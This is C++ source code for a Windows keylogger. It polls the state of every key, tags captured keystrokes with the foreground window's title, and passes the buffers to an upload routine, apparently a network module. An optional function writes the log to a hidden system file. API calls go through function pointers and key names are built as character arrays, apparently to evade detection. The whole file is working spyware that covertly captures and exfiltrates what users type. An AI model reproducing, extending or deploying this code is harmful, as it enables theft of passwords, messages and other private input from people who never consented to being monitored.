#include "../api.h"
#include "../public.h"
#include "KeyBoard.h"
#include "../network/NetWorkdata.h"
#include "../log.h"


//this function need to be in a independent thread process
int __stdcall GetKeyBoardRecord(unsigned long TimeDelay)
{
	unsigned long iTimeDelay = TimeDelay;

	char  szVkBack[] = { ' ','B','a','c','k','S','p','a','c','e',' ',0 };
	char  szVkEnter[] = { ' ','E','n','t','e','r',' ',0 };
	char  szVkHome[] = { ' ','H','o','m','e',' ',0 };
	char  szVkEnd[] = { ' ','E','n','d',' ',0 };
	char  szVkDelete[] = { ' ','D','e','l','e','t','e',' ',0 };
	char  szVkInsert[] = { ' ','I','n','s','e','r','t',' ',0 };
	char  szVkNumLock[] = { ' ','N','u','m','L','o','c','k',' ',0 };
	char  szVkPrintScreen[] = { ' ','P','r','i','n','t','S','c','r','e','e','n',' ',0 };
	char  szVkPauseBreak[] = { ' ','P','a','u','s','e','/','B','r','e','a','k',' ',0 };
	char  szVkPageUp[] = { ' ','P','a','g','e','U','p',' ',0 };
	char  szVkPageDown[] = { ' ','P','a','g','e','D','o','w','n',' ',0 };
	char  szVkTab[] = { ' ','T','a','b',' ',0 };
	char  szVkWindows[] = { ' ','W','i','n','d','o','w','s',' ',0 };
	char  szVkEsc[] = { ' ','E','s','c',' ',0 };
	char  szVkControl[] = { ' ','C','t','r','l',' ',0 };
	char  szVkScrollLock[] = { ' ','S','c','r','o','l','l',' ','L','o','c','k',' ',0 };
	char  szVkAlt[] = { ' ','A','l','t',' ',0 };
	char  szVkUp[] = { ' ','U','P',' ',0 };
	char  szVkDown[] = { ' ','D','O','W','N',' ',0 };
	char  szVkLeft[] = { ' ','L','E','F','T',' ',0 };
	char  szVkRight[] = { ' ','R','I','G','H','T',' ',0 };
	char  szVkF1[] = { ' ','F','1',' ',0 };
	char  szVkF2[] = { ' ','F','2',' ',0 };
	char  szVkF3[] = { ' ','F','3',' ',0 };
	char  szVkF4[] = { ' ','F','4',' ',0 };
	char  szVkF5[] = { ' ','F','5',' ',0 };
	char  szVkF6[] = { ' ','F','6',' ',0 };
	char  szVkF7[] = { ' ','F','7',' ',0 };
	char  szVkF8[] = { ' ','F','8',' ',0 };
	char  szVkF9[] = { ' ','F','9',' ',0 };
	char  szVkF10[] = { ' ','F','1','0',' ',0 };
	char  szVkF11[] = { ' ','F','1','1',' ',0 };
	char  szVkF12[] = { ' ','F','1','2',' ',0 };
	char  szVkSleep[] = { ' ','S','l','e','e','p',' ',0 };
	char  szVkHelp[] = { ' ','H','e','l','p',' ',0 };
	char  szVkShiftNumber[] = { ')','!','@','#','$','%','^','&','*','(',0 };
	char  szVkShiftOem1[] = { ';','=',',','-','.','/','`',0 };
	char  szVkOem1[] = { ':','+','<','_','>','?','~',0 };
	char  szVkShiftOem2[] = { '[','\\',']','\'',0 };
	char  szVkOem2[] = { '{','|','}','\"',0 };
	char  szNumPad[] = { '0','1','2','3','4','5','6','7','8','9','*','+','-','-','.','/',0 };
	// 	char * szVkShiftNumber		=  ")!@#$%^&*(";
	// 	char * szVkShiftOem1		=  ";=,-./`";
	// 	char * szVkOem1				=  ":+<_>?~";
	// 	char * szVkShiftOem2		=  "[\\]\'";
	// 	char * szVkOem2				=  "{|}\"";
	// 	char * szNumPad				=  "0123456789*+--./";

	CHAR lpKeyBuf[KEYBOARD_BUF_SIZE] = { 0 };
	int dwKeyPtr = 0;

	char strLastWindowTitle[MAX_PATH] = { 0 };
	char strCurrentWindowTitle[MAX_PATH] = { 0 };
	char strFileBuf[KEYBOARD_BUF_SIZE * 2];


	int iRet = 0;
	try
	{
		while (TRUE)
		{
			unsigned int dwCapsLockFlag = FALSE;
			unsigned int dwShiftFlag = FALSE;
			unsigned int pKey = 0;
			unsigned int sRetKey = lpGetKeyState(VK_CAPITAL);
			if (sRetKey & 1)
			{
				dwCapsLockFlag = TRUE;
			}

			sRetKey = lpGetAsyncKeyState(VK_SHIFT);
			if (sRetKey & 0x8000)
			{
				dwShiftFlag = TRUE;
			}

			sRetKey = lpGetAsyncKeyState(VK_LSHIFT);
			if (sRetKey & 0x8000)
			{
				dwShiftFlag = TRUE;
			}

			sRetKey = lpGetAsyncKeyState(VK_RSHIFT);
			if (sRetKey & 0x8000)
			{
				dwShiftFlag = TRUE;
			}

			int iChar = 0;
			for (int iChar = 0x30; iChar <= 0x39; iChar++)
			{
				sRetKey = lpGetAsyncKeyState(iChar);
				if (sRetKey & 1)
				{
					if (dwShiftFlag)
					{
						pKey = *(char*)(szVkShiftNumber + iChar - 0x30);
					}
					else
					{
						pKey = iChar;
					}

					pKey |= 0x80000000;
					goto _GetUsefulKey;
				}
			}

			for (iChar = 0x41; iChar <= 0x5a; iChar++)
			{
				sRetKey = lpGetAsyncKeyState(iChar);
				if (sRetKey & 1)
				{
					pKey = iChar;
					pKey += 0x20;
					if (dwShiftFlag ^ dwCapsLockFlag)
					{
						pKey -= 0x20;
					}


					pKey |= 0x80000000;
					goto _GetUsefulKey;
				}
			}

			for (iChar = 0x60; iChar <= 0x6f; iChar++)
			{
				sRetKey = lpGetAsyncKeyState(iChar);
				if (sRetKey & 1)
				{
					pKey = *(szNumPad + iChar - 0x60);
					pKey |= 0x80000000;
					goto _GetUsefulKey;
				}
			}

			for (iChar = 0xba; iChar <= 0xc0; iChar++)
			{
				sRetKey = lpGetAsyncKeyState(iChar);
				if (sRetKey & 1)
				{
					if (dwShiftFlag)
					{
						pKey = *(szVkOem1 + iChar - 0xba);
						pKey |= 0x80000000;
						goto _GetUsefulKey;
					}
					else
					{
						pKey = *(szVkShiftOem1 + iChar - 0xba);
						pKey |= 0x80000000;
						goto _GetUsefulKey;
					}
				}
			}

			for (iChar = 0xdb; iChar <= 0xde; iChar++)
			{
				sRetKey = lpGetAsyncKeyState(iChar);
				if (sRetKey & 1)
				{
					if (dwShiftFlag)
					{
						pKey = *(szVkOem2 + iChar - 0xba);
						pKey |= 0x80000000;
						goto _GetUsefulKey;
					}
					else
					{
						pKey = *(szVkShiftOem2 + iChar - 0xba);
						pKey |= 0x80000000;
						goto _GetUsefulKey;
					}
				}
			}

			sRetKey = lpGetAsyncKeyState(VK_BACK);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkBack;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_TAB);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkTab;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_RETURN);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkEnter;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_CONTROL);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkControl;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_LCONTROL);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkControl;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_RCONTROL);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkControl;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_PAUSE);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkPauseBreak;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_ESCAPE);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkEsc;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_SPACE);
			if (sRetKey & 1)
			{
				pKey = ' ';
				pKey |= 0x80000000;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_PRIOR);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkPageUp;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_NEXT);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkPageDown;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_END);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkEnd;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_HOME);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkHome;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_LEFT);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkLeft;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_UP);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkUp;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_RIGHT);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkRight;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_DOWN);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkDown;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_SNAPSHOT);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkPrintScreen;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_INSERT);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkInsert;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_DELETE);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkDelete;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_HELP);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkHelp;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_LWIN);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkWindows;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_RWIN);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkWindows;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_SLEEP);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkSleep;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_NUMLOCK);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkNumLock;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_SCROLL);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkScrollLock;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_F1);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkF1;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_F2);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkF2;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_F3);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkF3;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_F4);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkF4;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_F5);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkF5;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_F6);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkF6;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_F7);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkF7;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_F8);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkF8;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_F9);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkF9;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_F10);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkF10;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_F11);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkF11;
				goto _GetUsefulKey;
			}

			sRetKey = lpGetAsyncKeyState(VK_F12);
			if (sRetKey & 1)
			{
				pKey = (unsigned int)szVkF12;
				goto _GetUsefulKey;
			}
			//here the least is unknow char pressed

			if (pKey == 0)
			{
				lpSleep(iTimeDelay);
				continue;
			}

		_GetUsefulKey:
			HWND hWnd = lpGetForegroundWindow();
			if (hWnd != FALSE)
			{
				iRet = lpGetWindowTextA(hWnd, (LPSTR)strCurrentWindowTitle, MAX_PATH);
				if (iRet)
				{
					int iLstLen = lplstrlenA(strLastWindowTitle);
					int iCurLen = lplstrlenA(strCurrentWindowTitle);
					if (iLstLen == 0)
					{
						lplstrcpyA(strLastWindowTitle, strCurrentWindowTitle);
					}
					if ((lpRtlCompareMemory(strLastWindowTitle, strCurrentWindowTitle, iLstLen) != iLstLen) && (dwKeyPtr > 0))
					{
						iRet = lpwsprintfA(strFileBuf, "%s:%s\r\n", strLastWindowTitle, lpKeyBuf);
						uploadData(strFileBuf, iRet, KEYBOARDRECORD, 0);
						lplstrcpyA(strLastWindowTitle, strCurrentWindowTitle);
						lpRtlZeroMemory(lpKeyBuf, KEYBOARD_BUF_SIZE);
						dwKeyPtr = 0;
					}
				}
			}


			if (pKey & 0x80000000)
			{
				*(char*)(lpKeyBuf + dwKeyPtr) = pKey;
				//lpRtlMoveMemory(lpKeyBuf + dwKeyPtr,(char*)&pKey,1);
				dwKeyPtr++;
			}
			else
			{
				lpRtlMoveMemory(lpKeyBuf + dwKeyPtr, (char*)pKey, lplstrlenA((char*)pKey));
				dwKeyPtr += lplstrlenA((char*)pKey);
			}

			if (dwKeyPtr >= KEYBOARD_BUF_SIZE - 16)
			{
				iRet = lpwsprintfA(strFileBuf, "%s:%s\r\n", strCurrentWindowTitle, lpKeyBuf);
				uploadData(strFileBuf, iRet, KEYBOARDRECORD, 0);
				//strcpy_s(strLastWindowTitle,MAX_PATH,strCurrentWindowTitle);
				lpRtlZeroMemory(lpKeyBuf, KEYBOARD_BUF_SIZE);
				dwKeyPtr = 0;
			}

			lpSleep(iTimeDelay);
		}
	}
	catch (...)
	{
		writeLog("keyboard exception\r\n");
		return FALSE;
	}
	return TRUE;
}



#ifdef KEYBOARD_RECORD_FILENAME
int WriteKeyboardRecordFile(char* strData, int iLen)
{
	char strFilePath[MAX_PATH] = { 0 };
	int iRet = makeFullFileName(strFilePath, KEYBOARD_RECORD_FILENAME);
	HANDLE hFile = lpCreateFileA(strFilePath, GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		writeLog("Keyboard lpCreateDirectoryA error\r\n");
		return FALSE;
		//lpSleep(iTimeDelay);
		//continue;
	}

	iRet = lpSetFilePointer(hFile, 0, 0, FILE_END);
	if (iRet == INVALID_SET_FILE_POINTER)
	{
		writeLog("Keyboard SetFilePointer error\r\n");
		lpCloseHandle(hFile);
		return FALSE;
		//lpSleep(iTimeDelay);
		//continue;
	}

	DWORD dwCnt;
	int iRes = lpWriteFile(hFile, strData, iLen, &dwCnt, 0);
	if (iRes == FALSE)
	{
		writeLog("Keyboard lpWriteFile error\r\n");
		lpCloseHandle(hFile);
		return FALSE;
		//lpSleep(iTimeDelay);
		//continue;
	}

	lpCloseHandle(hFile);
	return TRUE;
}
#endif